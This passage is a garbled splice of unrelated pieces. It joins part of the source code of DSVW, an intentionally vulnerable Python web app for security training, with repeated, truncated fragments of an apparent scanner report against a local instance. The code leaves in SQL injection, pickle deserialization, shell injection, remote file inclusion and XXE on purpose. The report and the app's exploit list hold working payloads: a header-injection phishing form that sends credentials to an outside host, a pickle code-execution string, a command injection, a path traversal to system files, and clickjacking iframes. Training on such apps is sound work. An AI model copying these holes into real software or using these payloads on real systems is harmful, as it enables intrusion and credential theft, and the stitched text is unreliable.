"/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E", "https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection"), ("Component with Known Vulnerability (<i>pickle</i>)", "/?object=%s" % urllib.parse.quote(pickle.dumps(dict((_.findtext("username"), (_.findtext("name"), _.findtext("surname"))) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user")))), "/?object=cos%%0Asystem%%0A(S%%27%s%%27%%0AtR.%%0A\" onclick=\"alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')" % urllib.parse.quote("ping -c 5 127.0.0.1" if os.name != "nt" else "ping -n 5 127.0.0.1"), "https://www.cs.uic.edu/~s/musings/pickle.html"), ("Denial of Service (<i>memory</i>)", "/?size=32", "/?size=9999999", "https://owasp.org/www-community/attacks/Denial_of_Service"))

def init():
    global connection
    http.server.HTTPServer.allow_reuse_address = True
    connection = sqlite3.connect(":memory:", isolation_level=None, check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, name TEXT, surname TEXT, password TEXT)")
    cursor.executemany("INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)", ((_.findtext("username"), _.findtext("name"), _.findtext("surname"), _.findtext("password")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user")))
    cursor.execute("CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)")

class ReqHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, "")
        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group("parameter"), urllib.parse.unquote(','.join(re.findall(r"(?:\A|[?&])%s=([^&]+)" % match.group("parameter"), query)))) for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)([^&]+)", query)), connection.cursor()
        try:
            if path == '/':
                if "id" in params:
                    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
                    content += "<div><span>Result(s):</span></div><table><thead><th>id</th><th>username</th><th>name</th><th>surname</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "v" in params:
                    content += re.sub(r"(v<b>)[^<]+(</b>)", r"\g<1>%s\g<2>" % params["v"], HTML_POSTFIX)
                elif "object" in params:
                    content = str(pickle.loads(params["object"].encode()))
                elif "path" in params:
                    content = (open(os.path.abspath(params["path"]), "rb") if not "://" in params["path"] else urllib.request.urlopen(params["path"])).read().decode()
                elif "domain" in params:
                    content = subprocess.check_output("nslookup " + params["domain"], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).decode()
                elif "xml" in params:
                    content = lxml.etree.tostring(lxml.etree.parse(io.BytesIO(params["xml"].encode()), lxml.etree.XMLParser(no_network=False)), pretty_print=True).decode()
                elif "name" in params:
                    found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(".//user[name/text()='%s']" % params["name"])
                    content += "<b>Surname:</b> %s%s" % (found[-1].find("surname").text if found else "-", HTML_POSTFIX)
                elif "size" in params:
                    start, _ = time.time(), "<br>".join("#" * int(params["size"]) for _ in range(int(params["size"])))
                    content += "<b>Time required</b> (to 'resize image' to %dx%d): %.6f seconds%s" % (int(params["size"]), int(params["size"]), time.time() - start, HTML_POSTFIX)
                elif "comment" in params or query == "comment=":
                    if "comment" in params:
                        cursor.execute("INSERT INTO comments VALUES(NULL, '%s', '%s')" % (params["comment"], time.ctime()))
                        content += "Thank you for leaving the comment. Please click here <a href=\"/?comment=\">here</a> to see all comments%s" % HTML_POSTFIX
                    else:
                        cursor.execute("SELECT id, comment, time FROM comments")
                        content += "<div><span>Comment(s):</span></div><table><thead><th>id</th><th>comment</th><th>time</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "include" in params:
                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params["include"], "rb") if not "://" in params["include"] else urllib.request.urlopen(params["include"])).read(), {"DOCUMENT_ROOT": os.getcwd(), "HTTP_USER_AGENT": self.headers.get("User-Agent"), "REMOTE_ADDR": self.client_address[0], "REMOTE_PORT": self.client_address[1], "PATH": path, "QUERY_STRING": query}
                    exec(program, envs)
                    content += sys.stdout.getvalue()
                    sys.stdout = backup
                elif "redir" in params:
                    content = content.replace("<head>", "<head><meta http-equiv=\"refresh\" content=\"0; url=%s\"/>" % params["redir"])
                if HTML_PREFIX in content and HTML_POSTFIX not in content:
                    content += "<div><span>Attacks:</span></div>\n<ul>%s\n</ul>\n" % ("".join("\n<li%s>%s - <a href=\"%s\">vulnerable</a>|<a href=\"%s\">exploit</a>|<a href=\"%s\" target=\"_blank\">info</a></li>" % (" class=\"disabled\" title=\"module 'python-lxml' not installed\"" if ("lxml.etree" not in sys.modules and any(_ in case[0].upper() for _ in ("XML", "XPATH"))) else "", case[0], case[1], case[2], case[3]) for case in CASES)).replace("<a href=\"None\">vulnerable</a>|", "<b>-</b>|")
            elif path == "/users.json":
                content = "%s%s%s" % ("" if not "callback" in params else "%s(" % params["callback"], json.dumps(dict((_.findtext("username"), _.findtext("surname")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user"))), "" if not "callback" in params else ")")
            elif path == "/login":
                cursor.execute("SELECT * FROM users WHERE username='" + re.sub(r"[^\w]", "", params.get("username", "")) + "' AND password='" + params.get("password", "") + "'")
                content += "Welcome <b>%s</b><meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=%s; path=/\"><meta http-equiv=\"refresh\" content=\"1; url=/\"/>" % (re.sub(r"[^\w]", "", params.get("username", "")), "".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else "The username and/or password is incorrect<meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\">"
            else:
                code = http.client.NOT_FOUND
        except Exception as ex:
            content = ex.output if isinstance(ex, subprocess.CalledProcessError) else traceback.format_exc()
            code = http.client.INTERNAL_SERVER_ERROR
        finally:
            self.send_response(code)
            self.send_header("Connection", "close")
            self.send_header("X-XSS-Protection", "0")
            self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
            self.end_headers()
            self.wfile.write(("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else "")).encode())
            self.wfile.flush()

class ThreadingServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        http.server.HTTPServer.server_bind(self)

if __name__ == "__main__":
    init()
    print("%s #v%s\n by: %s\n\n[i] running HTTP server at 'http://%s:%d'..." % (NAME, VERSION, AUTHOR, LISTEN_ADDRESS, LISTEN_PORT))
    try:
        ThreadingServer((LISTEN_ADDRESS, LISTEN_PORT), ReqHandler).serve_forever()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        print("[x] exception occurred ('%s')" % ex)
    finally:
        os._exit(0)
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        21. GET http://127.0.0.1:65412/?redir=
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (376 bytes) 
          GET http://127.0.0.1:65412/?redir= HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:11:50 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes) 
          <!DOCTYPE html>

<head>

<li>File Inclusion (<i>remote</i>) - <a href="/?include=">vulnerable</a>|<a href="/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3D6VyyNNhc&amp;cmd=ipconfig">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank">info</a></li>
<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2b</b>)</div>
</body>
</html>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        22. GET http://127.0.0.1:65412/?redir=http%3A%2F%2Fdsvw.c1.biz
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (407 bytes) 
          GET http://127.0.0.1:65412/?redir=http%3A%2F%2Fdsvw.c1.biz HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/?redir=
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:11:51 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (1013 bytes) 
          <!DOCTYPE html>
<html>

          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        23. GET http://127.0.0.1:65412/?size=32

          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type.           At "High" threshold this scan rule will not alert on client or server error responses.

<li>Clickjacking - <b>-</b>|<a href="/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking" target="_blank">info</a></li>

<li>Arbitrary Code Execution - <a href="/?domain=www.google.com">vulnerable</a>|<a href="/?domain=www.google.com%26%20ipconfig">exploit</a>|<a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution" target="_blank">info</a></li>
<li>Full Path Disclosure - <a href="/?path=">vulnerable</a>|<a href="/?path=foobar">exploit</a>|<a href="https://owasp.org/www-community/attacks/Full_Path_Disclosure" target="_blank">info</a></li>
<li>Source Code Disclosure - <a href="/?path=">vulnerable</a>|<a href="/?path=dsvw.py">exploit</a>|<a href="https://www.imperva.com/resources/glossary?term=source_code_disclosure" target="_blank">info</a></li>
<li>Path Traversal - <a href="/?path=">vulnerable</a>|<a href="/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini">exploit</a>|<a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank">info</a></li>
<li>File Inclusion (<i>remote</i>) - <a href="/?include=">vulnerable</a>|<a href="/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3D6VyyNNhc&amp;cmd=ipconfig">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank">info</a></li>
<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        25. GET http://127.0.0.1:65412/?v=0.2
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (375 bytes) 
          GET http://127.0.0.1:65412/?v=0.2 HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:34 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12731 bytes) 
          <!DOCTYPE html>
<html>
<head>

</head>

<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        26. GET http://127.0.0.1:65412/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request

<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        27. GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

          This issue still applies to error type pages (401, 403, 500, etc.) as those pages are often still affected by injection issues, in which case there is still concern for browsers sniffing pages away from their actual content type.

          At "High" threshold this scan rule will not alert on client or server error responses.
          Request
          Request line and header section (602 bytes) 
          GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10

X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12884 bytes)

<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
          Parameter 
          X-Content-Type-Options
          Solution

          Ensure that the application/web server sets the Content-Type header appropriately, and that it sets the X-Content-Type-Options header to 'nosniff' for all web pages.

          If possible, ensure that the end user uses a standards-compliant and modern web browser that does not perform MIME-sniffing at all, or that can be directed by the web application/web server to not perform MIME-sniffing.
        28. GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E
          Alert tags
          • OWASP_2021_A05
          • OWASP_2017_A06
          Alert description

          The Anti-MIME-Sniffing header X-Content-Type-Options was not set to 'nosniff'. This allows older versions of Internet Explorer and Chrome to perform MIME-sniffing on the response body, potentially causing the response body to be interpreted and displayed as a content type other than the declared content type. Current (early 2014) and legacy versions of Firefox will use the declared content type (if one is set), rather than performing MIME-sniffing.
          Other info

